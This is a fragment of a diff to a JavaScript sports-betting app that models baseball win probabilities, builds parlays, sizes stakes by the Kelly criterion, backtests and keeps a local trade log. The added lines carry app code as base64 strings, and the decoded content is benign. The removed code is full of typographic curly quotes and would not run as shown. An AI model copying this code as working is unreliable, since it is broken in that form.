+`aXY+Jzt9ZWxzZXtodG1sKz0nPGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4O2Zs`,
+`ZXgtZGlyZWN0aW9uOmNvbHVtbjtnYXA6NnB4Ij4nO3RyYWRlcy5mb3JFYWNo`,
+`KGZ1bmN0aW9uKHQpe3ZhciBpc1BlbmRpbmc9dC5yZXN1bHQ9PT0ncGVuZGlu`,
+`ZycsaXNXaW49dC5yZXN1bHQ9PT0nd2luJzt2YXIgcGF5b3V0PXQuYm9va01M`,
+`JiZ0LnN0YWtlPygobWxEZWModC5ib29rTUwpLTEpKnBhcnNlRmxvYXQodC5z`,
+`dGFrZSkpLnRvRml4ZWQoMik6Jz8nO2h0bWwrPSc8ZGl2IHN0eWxlPSJib3Jk`,
+`ZXItcmFkaXVzOjhweDtwYWRkaW5nOjExcHggMTNweDttYXJnaW4tYm90dG9t`,
+`OjZweDtiYWNrZ3JvdW5kOicrKGlzUGVuZGluZz8ncmdiYSgyNTUsMjU1LDI1`,
+`NSwuMDIpJzppc1dpbj8ncmdiYSg1OCwxMzgsOTAsLjA3KSc6J3JnYmEoMTM4`,
+`LDU4LDU4LC4wNyknKSsnO2JvcmRlcjoxcHggc29saWQgJysoaXNQZW5kaW5n`,
+`PycjMjUyMDE1Jzppc1dpbj8nIzFhM2EyYSc6JyMzYTFhMWEnKSsnIj48ZGl2`,
+`IHN0eWxlPSJkaXNwbGF5OmZsZXg7anVzdGlmeS1jb250ZW50OnNwYWNlLWJl`,
+`dHdlZW47YWxpZ24taXRlbXM6ZmxleC1zdGFydDtnYXA6OHB4O2ZsZXgtd3Jh`,
+`cDp3cmFwIj48ZGl2IHN0eWxlPSJmbGV4OjEiPjxkaXYgc3R5bGU9ImZvbnQt`,
+`c2l6ZToxM3B4O2ZvbnQtd2VpZ2h0OjcwMDtjb2xvcjonKyhpc1dpbj8nI2Uw`,
+`YjA0MCc6aXNQZW5kaW5nPycjYzhiODkwJzonIzg4OCcpKyciPicrdC50ZWFt`,
+`Kyc8L2Rpdj48ZGl2IHN0eWxlPSJmb250LXNpemU6MTBweDtjb2xvcjojNmE1`,
+`YTNhO21hcmdpbi10b3A6MnB4Ij52cyAnK3Qub3Bwb25lbnQrJyAnK3QuZGF0`,
+`ZSsnPC9kaXY+PGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4O2dhcDoxMHB4O21h`,
+`cmdpbi10b3A6NHB4O2ZsZXgtd3JhcDp3cmFwIj4nO2lmKHQuYm9va01MKWh0`,
+`bWwrPSc8c3BhbiBzdHlsZT0iZm9udC1zaXplOjExcHg7Zm9udC1mYW1pbHk6`,
+`bW9ub3NwYWNlO2NvbG9yOicrKHQuYm9va01MWzBdPT09JysnPycjNWFiYThh`,
+`JzonI2M4Yjg5MCcpKyciPicrdC5ib29rTUwrJzwvc3Bhbj4nO2lmKHQuZWRn`,
+`ZVBjdClodG1sKz0nPHNwYW4gc3R5bGU9ImZvbnQtc2l6ZToxMXB4O2ZvbnQt`,
+`ZmFtaWx5Om1vbm9zcGFjZTtjb2xvcjonKyhwYXJzZUZsb2F0KHQuZWRnZVBj`,
+`dCk+PTM/JyM1YWJhOGEnOnBhcnNlRmxvYXQodC5lZGdlUGN0KT49MD8nI2Mw`,
+`YzA2MCc6JyNjMDYwNjAnKSsnIj4nK3QuZWRnZVBjdCsnJSBlZGdlPC9zcGFu`,
+`Pic7aWYodC5zdGFrZSlodG1sKz0nPHNwYW4gc3R5bGU9ImZvbnQtc2l6ZTox`,
+`MXB4O2NvbG9yOiM2YTVhM2EiPiQnK3Quc3Rha2UrJyBzdGFrZTwvc3Bhbj4n`,
+`O2h0bWwrPSc8c3BhbiBzdHlsZT0iZm9udC1zaXplOjEwcHg7Zm9udC13ZWln`,
+`aHQ6NzAwO2NvbG9yOicrY29uZkNvbCh0LmNvbmZpZGVuY2UpKyciPicrdC5j`,
+`b25maWRlbmNlKyc8L3NwYW4+PC9kaXY+PC9kaXY+PGRpdiBzdHlsZT0idGV4`,
+`dC1hbGlnbjpyaWdodCI+JztpZihpc1BlbmRpbmcpe2h0bWwrPSc8ZGl2IHN0`,
+`eWxlPSJmb250LXNpemU6MTBweDtjb2xvcjojNmE1YTNhO21hcmdpbi1ib3R0`,
+`b206NnB4Ij4rJCcrcGF5b3V0KycgaWYgd2luPC9kaXY+PGRpdiBzdHlsZT0i`,
+`ZGlzcGxheTpmbGV4O2dhcDo1cHgiPjxidXR0b24gb25jbGljaz0ibWFya1dp`,
+`bignK3QuaWQrJykiIHN0eWxlPSJwYWRkaW5nOjRweCAxMHB4O2JvcmRlci1y`,
+`YWRpdXM6NHB4O2JvcmRlcjpub25lO2JhY2tncm91bmQ6IzJhNWEzYTtjb2xv`,
+`cjojNWFiYThhO2ZvbnQtc2l6ZToxMXB4O2ZvbnQtd2VpZ2h0OjcwMDtjdXJz`,
+`b3I6cG9pbnRlciI+V0lOPC9idXR0b24+PGJ1dHRvbiBvbmNsaWNrPSJtYXJr`,
+`TG9zcygnK3QuaWQrJykiIHN0eWxlPSJwYWRkaW5nOjRweCAxMHB4O2JvcmRl`,
+`ci1yYWRpdXM6NHB4O2JvcmRlcjpub25lO2JhY2tncm91bmQ6IzVhMmEyYTtj`,
+`b2xvcjojYzA2MDYwO2ZvbnQtc2l6ZToxMXB4O2ZvbnQtd2VpZ2h0OjcwMDtj`,
+`dXJzb3I6cG9pbnRlciI+TE9TUzwvYnV0dG9uPjwvZGl2Pic7fWVsc2V7dmFy`,
+`IHBubE51bT1wYXJzZUZsb2F0KHQucG5sKXx8MDtodG1sKz0nPGRpdiBzdHls`,
+`ZT0iZm9udC1zaXplOjE4cHg7Zm9udC13ZWlnaHQ6OTAwO2ZvbnQtZmFtaWx5`,
+`Om1vbm9zcGFjZTtjb2xvcjonKyhwbmxOdW0+PTA/JyM1YWJhOGEnOicjYzA2`,
+`MDYwJykrJyI+JysocG5sTnVtPj0wPycrJzonJykrJyQnK3QucG5sKyc8L2Rp`,
+`dj48ZGl2IHN0eWxlPSJmb250LXNpemU6MTBweDtjb2xvcjonKyhpc1dpbj8n`,
+`IzNhNmEzYSc6JyM2YTNhM2EnKSsnO21hcmdpbi10b3A6MnB4Ij4nKyhpc1dp`,
+`bj8nV0lOJzonTE9TUycpKyc8L2Rpdj4nO31odG1sKz0nPC9kaXY+PC9kaXY+`,
+`PGJ1dHRvbiBvbmNsaWNrPSJkZWxUcmFkZSgnK3QuaWQrJykiIHN0eWxlPSJt`,
+`YXJnaW4tdG9wOjZweDtwYWRkaW5nOjJweCA4cHg7Ym9yZGVyLXJhZGl1czoz`,
+`cHg7Ym9yZGVyOjFweCBzb2xpZCAjMmUyNDE2O2JhY2tncm91bmQ6dHJhbnNw`,
+`YXJlbnQ7Y29sb3I6IzNhMmExYTtmb250LXNpemU6OXB4O2N1cnNvcjpwb2lu`,
+`dGVyIj5yZW1vdmU8L2J1dHRvbj48L2Rpdj4nO30pO2h0bWwrPSc8L2Rpdj4n`,
+`O31lbC5pbm5lckhUTUw9aHRtbDt9CmZ1bmN0aW9uIHNob3dMb2dGb3JtKCl7`,
+`dmFyIGY9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZy1mb3JtJyk7aWYo`,
+`ZilmLnN0eWxlLmRpc3BsYXk9J2Jsb2NrJzt9CmZ1bmN0aW9uIGhpZGVMb2dG`,
+`b3JtKCl7dmFyIGY9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZy1mb3Jt`,
+`Jyk7aWYoZilmLnN0eWxlLmRpc3BsYXk9J25vbmUnO30KZnVuY3Rpb24gc3Vi`,
+`bWl0TG9nKCl7dmFyIGdpRWw9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2x0`,
+`LWdhbWUnKTt2YXIgbWxFbD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbHQt`,
+`bWwnKTt2YXIgc3RFbD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbHQtc3Rh`,
+`a2UnKTt2YXIgZHRFbD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbHQtZGF0`,
+`ZScpO3ZhciBibWw9bWxFbD9tbEVsLnZhbHVlOicnO3ZhciBzdGFrZT1zdEVs`,
+`P3N0RWwudmFsdWU6Jyc7dmFyIGRhdGU9ZHRFbD9kdEVsLnZhbHVlOlMuZGF0`,
+`ZTtpZighc3Rha2Upe2FsZXJ0KCdFbnRlciBhIHN0YWtlIGFtb3VudC4nKTty`,
+`ZXR1cm47fXZhciB0ZWFtLG9wcG9uZW50LGNvbmZpZGVuY2UsbW9kZWxQLG1v`,
+`ZGVsTUw7aWYoZ2lFbCYmZ2lFbC52YWx1ZSE9PScnKXt2YXIgcj1TLnJlc3Vs`,
+`dHNbcGFyc2VJbnQoZ2lFbC52YWx1ZSldO2lmKCFyKXthbGVydCgnU2VsZWN0`,
+`IGEgZ2FtZS4nKTtyZXR1cm47fWlmKCFibWwmJlMuYm9va09kZHNbci5nYW1l`,
+`UGtdKWJtbD1TLmJvb2tPZGRzW3IuZ2FtZVBrXTt0ZWFtPXIud2lubmVyO29w`,
+`cG9uZW50PXIud2lubmVyPT09ci5hTmFtZT9yLmJOYW1lOnIuYU5hbWU7Y29u`,
+`ZmlkZW5jZT1yLmNvbmZpZGVuY2U7bW9kZWxQPShyLndpbm5lclAqMTAwKS50`,
+`b0ZpeGVkKDEpO21vZGVsTUw9ci53aW5uZXJNTDt9ZWxzZXt0ZWFtPSdDdXN0`,
+`b20nO29wcG9uZW50PSc/Jztjb25maWRlbmNlPSdNZWRpdW0nO21vZGVsUD0n`,
+`Pyc7bW9kZWxNTD0nPyc7fXZhciBlPWJtbD9lZGdlQ2FsYyhwYXJzZUZsb2F0`,
+`KG1vZGVsUCkvMTAwLGJtbCk6bnVsbDt2YXIgdHJhZGVzPWxvYWRUcmFkZXMo`,
+`KTt0cmFkZXMudW5zaGlmdCh7aWQ6RGF0ZS5ub3coKSxkYXRlOmRhdGUsdGVh`,
+`bTp0ZWFtLG9wcG9uZW50Om9wcG9uZW50LGNvbmZpZGVuY2U6Y29uZmlkZW5j`,
+`ZSxtb2RlbFA6bW9kZWxQLG1vZGVsTUw6bW9kZWxNTCxib29rTUw6Ym1sLGVk`,
+`Z2VQY3Q6ZSE9PW51bGw/KGUqMTAwKS50b0ZpeGVkKDEpOicnLHN0YWtlOnBh`,
+`cnNlRmxvYXQoc3Rha2UpLHJlc3VsdDoncGVuZGluZycscG5sOicnfSk7c2F2`,
+`ZVRyYWRlcyh0cmFkZXMpO2hpZGVMb2dGb3JtKCk7cmVuZGVyVHJhZGVMb2co`,
+`KTt9CmZ1bmN0aW9uIG1hcmtXaW4oaWQpe3ZhciB0cmFkZXM9bG9hZFRyYWRl`,
+`cygpO3RyYWRlcz10cmFkZXMubWFwKGZ1bmN0aW9uKHQpe2lmKHQuaWQ9PT1p`,
+`ZCl7dC5yZXN1bHQ9J3dpbic7dC5wbmw9dC5ib29rTUw/KChtbERlYyh0LmJv`,
+`b2tNTCktMSkqcGFyc2VGbG9hdCh0LnN0YWtlKSkudG9GaXhlZCgyKToocGFy`,
+`c2VGbG9hdCh0LnN0YWtlKSkudG9GaXhlZCgyKTt9cmV0dXJuIHQ7fSk7c2F2`,
+`ZVRyYWRlcyh0cmFkZXMpO3JlbmRlclRyYWRlTG9nKCk7fQpmdW5jdGlvbiBt`,
+`YXJrTG9zcyhpZCl7dmFyIHRyYWRlcz1sb2FkVHJhZGVzKCk7dHJhZGVzPXRy`,
+`YWRlcy5tYXAoZnVuY3Rpb24odCl7aWYodC5pZD09PWlkKXt0LnJlc3VsdD0n`,
+`bG9zcyc7dC5wbmw9KC1wYXJzZUZsb2F0KHQuc3Rha2UpKS50b0ZpeGVkKDIp`,
+`O31yZXR1cm4gdDt9KTtzYXZlVHJhZGVzKHRyYWRlcyk7cmVuZGVyVHJhZGVM`,
+`b2coKTt9CmZ1bmN0aW9uIGRlbFRyYWRlKGlkKXtpZighY29uZmlybSgnUmVt`,
+`b3ZlIHRoaXMgdHJhZGU/JykpcmV0dXJuO3NhdmVUcmFkZXMobG9hZFRyYWRl`,
+`cygpLmZpbHRlcihmdW5jdGlvbih0KXtyZXR1cm4gdC5pZCE9PWlkO30pKTty`,
+`ZW5kZXJUcmFkZUxvZygpO30KZnVuY3Rpb24gZXhwb3J0Q1NWKCl7dmFyIHRy`,
+`YWRlcz1sb2FkVHJhZGVzKCk7aWYoIXRyYWRlcy5sZW5ndGgpe2FsZXJ0KCdO`,
+`byB0cmFkZXMgdG8gZXhwb3J0LicpO3JldHVybjt9dmFyIHJvd3M9WydEYXRl`,
+`LFRlYW0sT3Bwb25lbnQsQ29uZmlkZW5jZSxNb2RlbCUsTW9kZWwgTUwsQm9v`,
+`ayBNTCxFZGdlJSxTdGFrZSxSZXN1bHQsUCZMJ107dHJhZGVzLmZvckVhY2go`,
+`ZnVuY3Rpb24odCl7cm93cy5wdXNoKFt0LmRhdGUsdC50ZWFtLHQub3Bwb25l`,
+`bnQsdC5jb25maWRlbmNlLHQubW9kZWxQLHQubW9kZWxNTCx0LmJvb2tNTCx0`,
+`LmVkZ2VQY3QsdC5zdGFrZSx0LnJlc3VsdCx0LnBubF0uam9pbignLCcpKTt9`,
+`KTt2YXIgYmxvYj1uZXcgQmxvYihbcm93cy5qb2luKCcKJyldLHt0eXBlOid0`,
+`ZXh0L2Nzdid9KTt2YXIgdXJsPVVSTC5jcmVhdGVPYmplY3RVUkwoYmxvYik7`,
+`dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnYScpO2EuaHJlZj11cmw7`,
+`YS5kb3dubG9hZD0nZGlhbW9uZC1tYXJrZXQtdHJhZGVzLmNzdic7YS5jbGlj`,
+`aygpO1VSTC5yZXZva2VPYmplY3RVUkwodXJsKTt9CnJlbmRlckJvYXJkKCk7`
 ];
-if(h2h&&h2h.total>=3)factors.push({label:‘Head-to-Head’,aVal:h2h.awayWins+’-’+(h2h.total-h2h.awayWins)+’ away’,bVal:(h2h.total-h2h.awayWins)+’-’+h2h.awayWins+’ home’,delta:(h2h.awayPct-0.5)*0.20});
-factors.sort(function(x,y){return Math.abs(y.delta)-Math.abs(x.delta);});
-return{pctA:Math.round(pA*100),pctB:Math.round(pB*100),mlA:ml(pA),mlB:ml(pB),ou:(rA+rB+0.5).toFixed(1),
-confidence:Math.abs(pA-0.5)>0.15?‘High’:Math.abs(pA-0.5)>0.07?‘Medium’:‘Low’,
-winner:winner,winnerP:pA>=pB?pA:pB,winnerML:pA>=pB?ml(pA):ml(pB),
-projScore:pA>=pB?(Math.max(rA,rB)+’\u2013’+Math.min(rA,rB)):(Math.min(rA,rB)+’\u2013’+Math.max(rA,rB)),
-factors:factors,aName:A.name,bName:B.name,aPitcher:A.pitcherName,bPitcher:B.pitcherName,
-aBlend:A.pitch,bBlend:B.pitch,parkB:PARK[B.name]||100,h2h:h2h};
-}
-function buildParlays(results,bookOdds,minEdgePct){
-bookOdds=bookOdds||{};var minE=(minEdgePct||2)/100;
-var edgy=results.filter(function(r){return r.winnerP>=0.54;}).map(function(r){
-var bml=bookOdds[r.gamePk]||null;
-var e=bml?edge(r.winnerP,bml):null;
-var hasEdge=e!==null?e>=minE:true;
-var eml=bml||r.winnerML;
-return Object.assign({},r,{bookML:bml,edgePct:e,hasEdge:hasEdge,effectiveML:eml,kellyPct:kelly(r.winnerP,eml)*100});
-}).filter(function(r){return r.hasEdge;}).sort(function(a,b){
-var ea=a.edgePct!==null?a.edgePct:Math.abs(a.winnerP-0.5)*0.2;
-var eb=b.edgePct!==null?b.edgePct:Math.abs(b.winnerP-0.5)*0.2;
-return eb-ea;
-});
-var singles=edgy.slice(0,3).map(function(r){return{legs:[r],type:‘Single’,combinedP:r.winnerP,payout:mlDec(r.effectiveML),kellyPct:r.kellyPct,combinedEdge:r.edgePct};});
-var top4=edgy.slice(0,4),parlays2=[];
-for(var i=0;i<top4.length;i++)for(var j=i+1;j<top4.length;j++){
-var a=top4[i],b=top4[j];
-if(a.gamePk===b.gamePk)continue;
-var cp=a.winnerP*b.winnerP,pp=mlDec(a.effectiveML)*mlDec(b.effectiveML);
-var ce=(a.edgePct!==null&&b.edgePct!==null)?(a.edgePct+b.edgePct)/2:null;
-parlays2.push({legs:[a,b],type:‘2-Leg Parlay’,combinedP:cp,payout:pp,kellyPct:kelly(cp,’+’+Math.round((pp-1)*100))*100,combinedEdge:ce});
-}
-parlays2.sort(function(a,b){return(b.combinedEdge!==null?b.combinedEdge:b.combinedP)-(a.combinedEdge!==null?a.combinedEdge:a.combinedP);});
-var parlays3=[],top3=edgy.slice(0,3);
-if(top3.length===3&&top3[0].gamePk!==top3[1].gamePk&&top3[1].gamePk!==top3[2].gamePk&&top3[0].gamePk!==top3[2].gamePk){
-var cp3=top3[0].winnerP*top3[1].winnerP*top3[2].winnerP;
-var pp3=mlDec(top3[0].effectiveML)*mlDec(top3[1].effectiveML)*mlDec(top3[2].effectiveML);
-var ce3=(top3[0].edgePct!==null&&top3[1].edgePct!==null&&top3[2].edgePct!==null)?(top3[0].edgePct+top3[1].edgePct+top3[2].edgePct)/3:null;
-parlays3.push({legs:top3,type:‘3-Leg Parlay’,combinedP:cp3,payout:pp3,kellyPct:kelly(cp3,’+’+Math.round((pp3-1)*100))*100,combinedEdge:ce3});
-}
-return{singles:singles,parlays2:parlays2.slice(0,2),parlays3:parlays3,edgeFiltered:edgy.length};
-}
-function computeBacktest(results,bankroll){
-function rec(arr){if(!arr.length)return{w:0,l:0,pct:null};var w=arr.filter(function(r){return r.correct;}).length;return{w:w,l:arr.length-w,pct:(w/arr.length*100).toFixed(1)};}
-var bs=bankroll,peak=bankroll,maxDD=0;
-results.forEach(function(r){var k=kelly(r.winnerP,r.winnerML)*bs;var g=r.correct?k*(mlDec(r.winnerML)-1):-k;bs=Math.max(1,bs+g);peak=Math.max(peak,bs);maxDD=Math.max(maxDD,(peak-bs)/peak*100);});
-var buckets=[{label:‘54-58%’,lo:0.54,hi:0.58},{label:‘58-62%’,lo:0.58,hi:0.62},{label:‘62-66%’,lo:0.62,hi:0.66},{label:‘66-70%’,lo:0.66,hi:0.70},{label:‘70%+’,lo:0.70,hi:1.00}].map(function(b){
-var gs=results.filter(function(r){return r.winnerP>=b.lo&&r.winnerP<b.hi;});
-var wins=gs.filter(function(r){return r.correct;}).length;
-return{label:b.label,lo:b.lo,hi:b.hi,games:gs.length,wins:wins,actualPct:gs.length?(wins/gs.length*100).toFixed(1):null};
-});
-var byDate={};
-results.forEach(function(r){if(!byDate[r.date])byDate[r.date]=[];byDate[r.date].push(r);});
-var p1b=bankroll,p2b=bankroll,p3b=bankroll,parlayDays=[];
-Object.keys(byDate).sort().forEach(function(date){
-var plays;try{plays=buildParlays(byDate[date]);}catch(e){plays={singles:[],parlays2:[],parlays3:[]};}
-var s=plays.singles[0],p2=plays.parlays2[0],p3=plays.parlays3[0];
-if(s){var k=kelly(s.combinedP,s.legs[0].winnerML)*p1b;p1b=Math.max(1,p1b+(s.legs[0].correct?k*(mlDec(s.legs[0].winnerML)-1):-k));}
-if(p2){var od=p2.legs.reduce(function(a,l){return a*mlDec(l.winnerML);},1);var k=kelly(p2.combinedP,’+’+Math.round((od-1)*100))*p2b;p2b=Math.max(1,p2b+(p2.legs.every(function(l){return l.correct;})?k*(od-1):-k));}
-if(p3){var od=p3.legs.reduce(function(a,l){return a*mlDec(l.winnerML);},1);var k=kelly(p3.combinedP,’+’+Math.round((od-1)*100))*p3b;p3b=Math.max(1,p3b+(p3.legs.every(function(l){return l.correct;})?k*(od-1):-k));}
-parlayDays.push({date:date,
-single:s?{hit:s.legs[0].correct,label:s.legs[0].winner}:null,
-parlay2:p2?{hit:p2.legs.every(function(l){return l.correct;}),label:p2.legs.map(function(l){return l.winner;}).join(’ + ‘)}:null,
-parlay3:p3?{hit:p3.legs.every(function(l){return l.correct;}),label:p3.legs.map(function(l){return l.winner;}).join(’ + ’)}:null});
-});
-function pRec(days,key){var pl=days.filter(function(d){return d[key];});var wo=pl.filter(function(d){return d[key].hit;});return{w:wo.length,l:pl.length-wo.length,pct:pl.length?(wo.length/pl.length*100).toFixed(1):null};}
-return{all:rec(results),high:rec(results.filter(function(r){return r.confidence===‘High’;})),medium:rec(results.filter(function(r){return r.confidence===‘Medium’;})),low:rec(results.filter(function(r){return r.confidence===‘Low’;})),
-roi:((bs-bankroll)/bankroll*100).toFixed(1),finalBank:bs.toFixed(0),calibration:buckets,bets:results,parlayDays:parlayDays,
-p1Record:pRec(parlayDays,‘single’),p2Record:pRec(parlayDays,‘parlay2’),p3Record:pRec(parlayDays,‘parlay3’),
-p1Roi:((p1b-bankroll)/bankroll*100).toFixed(1),p2Roi:((p2b-bankroll)/bankroll*100).toFixed(1),p3Roi:((p3b-bankroll)/bankroll*100).toFixed(1)};
-}
-function analyzeGame(game,date){
-var yr=date.slice(0,4);
-return Promise.all([fetchSP(game.away.pitcherId,yr),fetchSP(game.home.pitcherId,yr),fetchHit(game.away.id,yr),fetchHit(game.home.id,yr),fetchPit(game.away.id,yr),fetchPit(game.home.id,yr),fetchDef(game.away.id,yr),fetchDef(game.home.id,yr),fetchRecent(game.away.id,date),fetchRecent(game.home.id,date),fetchStand(game.away.id,yr),fetchStand(game.home.id,yr),fetchH2H(game.away.id,game.home.id,yr)]).then(function(r){
-var A={name:game.away.name,pitcherName:game.away.pitcherName,pitch:blendPitch(r[0],r[4]),hit:r[2]||AVG_HIT,def:r[6]||AVG_DEF,recent:r[8]||{winPct:0.500},stand:r[10]||AVG_STAND};
-var B={name:game.home.name,pitcherName:game.home.pitcherName,pitch:blendPitch(r[1],r[5]),hit:r[3]||AVG_HIT,def:r[7]||AVG_DEF,recent:r[9]||{winPct:0.500},stand:r[11]||AVG_STAND};
-return Object.assign({},runModel(A,B,r[12]),{weather:game.weather,venue:game.venue,time:game.time,gamePk:game.gamePk});
-});
-}
-function analyzeGameCached(game,yr){
-return Promise.all([fetchSP(game.away.pitcherId,yr).catch(function(){return null;}),fetchSP(game.home.pitcherId,yr).catch(function(){return null;}),cachedStats(game.away.id,yr),cachedStats(game.home.id,yr),fetchRecent(game.away.id,game.date).catch(function(){return{winPct:0.500};}),fetchRecent(game.home.id,game.date).catch(function(){return{winPct:0.500};}),fetchH2H(game.away.id,game.home.id,yr).catch(function(){return null;})]).then(function(r){
-var csA=r[2]||{hit:AVG_HIT,pit:null,def:AVG_DEF,stand:AVG_STAND};
-var csB=r[3]||{hit:AVG_HIT,pit:null,def:AVG_DEF,stand:AVG_STAND};
-var A={name:game.away.name,pitcherName:game.away.pitcherName,pitch:blendPitch(r[0],csA.pit),hit:csA.hit,def:csA.def,recent:r[4]||{winPct:0.500},stand:csA.stand||AVG_STAND};
-var B={name:game.home.name,pitcherName:game.home.pitcherName,pitch:blendPitch(r[1],csB.pit),hit:csB.hit,def:csB.def,recent:r[5]||{winPct:0.500},stand:csB.stand||AVG_STAND};
-var res=runModel(A,B,r[6]);
-return Object.assign({},res,{date:game.date,actualWinner:game.actualWinner,correct:res.winner===game.actualWinner});
-});
-}
-
-// – TRADE LOG —————————————————————–
-function loadTrades(){try{return JSON.parse(localStorage.getItem(‘dm-trades’)||’[]’);}catch(e){return[];}}
-function saveTrades(t){try{localStorage.setItem(‘dm-trades’,JSON.stringify(t));}catch(e){}}
-function confCol(c){return c===‘High’?’#c8922a’:c===‘Medium’?’#8a8a3a’:’#6a5a3a’;}
-function edgeBadge(e){
-if(e===null||e===undefined)return’’;
-var col=e>=0.05?’#5aba8a’:e>=0.02?’#8aba5a’:’#c0c060’;
-return’<span style="font-size:11px;font-weight:900;font-family:monospace;color:'+col+';background:rgba(90,186,138,0.08);border:1px solid #2a4a2a;border-radius:4px;padding:2px 6px">’+(e>=0?’+’:’’)+( e*100).toFixed(1)+’% EDGE</span>’;
-}
-
-// – HTML HELPERS –––––––––––––––––––––––––––––––
-function winBar(pA,pB){return’<div class="win-bar"><div class="win-a" style="width:'+pA+'%">’+pA+’%</div><div class="win-b" style="width:'+pB+'%">’+pB+’%</div></div>’;}
-function factorRow(f){
-var favA=f.delta>0.005,favB=f.delta<-0.005;
-var pct=Math.round(Math.min(Math.abs(f.delta)/0.40,1)*100);
-var col=favA?’#c8922a’:favB?’#3a6a9a’:’#444’;
-var barStyle=favB?‘right:0’:‘left:0’;
-return’<div class="factor"><div style="display:flex;justify-content:space-between;margin-bottom:3px;flex-wrap:wrap;gap:3px"><span style="font-size:11px;color:#6a5a3a">’+f.label+’</span><span><span style="font-size:11px;font-family:monospace;color:'+(favA?'#e0b040':'#555')+'">’+f.aVal+’</span><span style="font-size:11px;color:#2e2416"> vs </span><span style="font-size:11px;font-family:monospace;color:'+(favB?'#7aabdf':'#555')+'">’+f.bVal+’</span></span></div><div class="fbar"><div class="fbar-fill" style="width:'+pct+'%;background:'+col+';'+barStyle+'"></div></div></div>’;
-}
-function pitchBox(name,p,pitcher){
-return’<div style="background:rgba(255,255,255,.02);border-radius:6px;padding:10px 12px;border:1px solid #2e2416"><div style="font-size:11px;font-weight:700;color:#c8b890;margin-bottom:3px">’+name.split(’ ‘).pop()+’</div><div style="font-size:10px;color:#6a5a3a;margin-bottom:4px">SP: ‘+pitcher+’</div><div style="font-size:10px;color:#5a4a2a;font-family:monospace">ERA ‘+p.starterEra.toFixed(2)+’ \xb7 FIP ‘+p.starterFip.toFixed(2)+’ \xb7 xFIP ‘+p.starterXfip.toFixed(2)+’</div><div style="font-size:10px;color:#4a4a2a;font-family:monospace;margin-top:1px">WHIP ‘+p.starterWhip.toFixed(2)+’ \xb7 K/9 ‘+p.starterK9.toFixed(1)+’ \xb7 BB/9 ‘+p.starterBb9.toFixed(1)+’</div><div style="margin-top:5px;padding:3px 8px;background:rgba(200,146,42,.06);border-radius:4px;font-family:monospace;font-size:10px;color:#c8922a;font-weight:700">Blended: FIP ‘+p.blendedFip.toFixed(2)+’ \xb7 WHIP ‘+p.blendedWhip.toFixed(2)+’ \xb7 K/9 ‘+p.blendedK9.toFixed(1)+’</div></div>’;
-}
-function parlayCardHTML(play){
-var typeCol=play.legs.length===1?’#c8922a’:play.legs.length===2?’#5a9ac0’:’#9a5ac0’;
-var stake=((play.kellyPct/100)*S.bankroll).toFixed(2);
-var winAmt=((play.payout-1)*parseFloat(stake)).toFixed(2);
-var confLabel=play.combinedP>=0.65?‘High’:play.combinedP>=0.57?‘Medium’:‘Low’;
-var edgeVal=play.combinedEdge!==null&&play.combinedEdge!==undefined?play.combinedEdge:(play.legs[0]?play.legs[0].edgePct:null);
-var html=’<div class="parlay-card" style="border:1px solid '+typeCol+';background:rgba(255,255,255,.02)">’;
-html+=’<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;flex-wrap:wrap;gap:6px"><span style="font-size:11px;font-weight:700;color:'+typeCol+';letter-spacing:2px;text-transform:uppercase">’+play.type+’</span>’;
-html+=’<div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">’+edgeBadge(edgeVal)+’<span style="font-size:11px;color:'+(play.combinedP>=0.65?'#c8922a':play.combinedP>=0.57?'#8a8a3a':'#6a5a3a')+';font-weight:700">’+confLabel+’</span><span style="font-size:11px;color:#6a5a3a;font-family:monospace">’+(play.combinedP*100).toFixed(1)+’%</span></div></div>’;
-play.legs.forEach(function(leg,li){
-html+=’<div class="parlay-leg" onclick="viewLegDetail('+li+',\''+leg.gamePk+'\')">’;
-html+=’<div><div style="font-size:13px;font-weight:700;color:#e0b040">’+leg.winner+’</div><div style="font-size:10px;color:#6a5a3a">’+(leg.winner===leg.aName?‘Away’:‘Home’)+’ \xb7 ‘+leg.time+’</div><div style="font-size:10px;color:#4a4a2a">vs ‘+(leg.winner===leg.aName?leg.bName:leg.aName)+’</div></div>’;
-html+=’<div style="text-align:right">’+(leg.bookML?’<div style="font-size:12px;font-weight:900;font-family:monospace;color:'+(leg.bookML[0]==='+'?'#5aba8a':'#c8b890')+'">’+leg.bookML+’ <span style="font-size:9px;color:#2e2416">book</span></div>’:’’);
-html+=’<div style="font-size:11px;font-family:monospace;color:#6a5a3a">’+leg.winnerML+’ <span style="font-size:9px;color:#2e2416">model</span></div>’;
-if(leg.edgePct!==null&&leg.edgePct!==undefined)html+=’<div style="font-size:11px;font-weight:700;color:'+(leg.edgePct>=0.03?'#5aba8a':'#c0c060')+'">’+(leg.edgePct>=0?’+’:’’)+(leg.edgePct*100).toFixed(1)+’%</div>’;
-html+=’</div></div>’;
-});
-html+=’<div style="margin-top:10px;padding:10px 12px;background:rgba(200,146,42,.05);border:1px solid #2e2416;border-radius:8px"><div style="display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:8px;text-align:center">’;
-[[‘Kelly %’,play.kellyPct.toFixed(1)+’%’,false],[‘Stake’,’$’+stake,false],[‘Payout’,play.payout.toFixed(2)+‘x’,false],[‘Net Win’,’$’+winAmt,true]].forEach(function(item){html+=’<div><div style="font-size:9px;color:#2e2416;letter-spacing:1px;text-transform:uppercase;margin-bottom:2px">’+item[0]+’</div><div style="font-size:13px;font-weight:900;font-family:monospace;color:'+(item[2]?'#5aba8a':'#c8b890')+'">’+item[1]+’</div></div>’;});
-html+=’</div>’;
-if(play.legs.length>1)html+=’<div style="margin-top:8px;font-size:10px;color:#2e2416;text-align:center">Win prob = ’+play.legs.map(function(l){return(l.winnerP*100).toFixed(0)+’%’;}).join(’ x ‘)+’ = ‘+(play.combinedP*100).toFixed(1)+’%</div>’;
-html+=’</div></div>’;
-return html;
-}
-
-// – TAB SWITCHING ———————————————————––
-var currentTab=0;
-function showTab(n){
-currentTab=n;
